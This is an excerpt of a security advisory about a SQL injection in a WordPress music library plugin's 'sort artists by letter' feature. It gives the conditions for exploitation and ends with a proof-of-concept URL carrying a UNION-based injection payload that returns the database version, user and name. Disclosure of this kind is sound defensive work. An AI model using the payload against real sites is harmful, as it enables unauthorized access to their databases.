Recommendation:
---------------
The author has provided a fixed plugin version which should be installed
immediately.


Vulnerability overview/description:
-----------------------------------
Because of insufficient input validation, a sql injection attack can be
performed when sorting artists by letter.

However, special conditions must be met in order to exploit this vulnerability:
1) The wordpress security feature wp_magic_quotes(), which is enabled by
   default, has to be disabled.
2) The plugin specific option "Filter artists by letter and show alphabetical
   navigation" has to be enabled.


Proof of concept:
-----------------
The following HTTP request to the Tune Library page returns version, current
user and db name:
===============================================================================
http://www.site.com/?page_id=2&artistletter=G' UNION ALL SELECT CONCAT_WS(CHAR(59),version(),current_user(),database()),2--%20
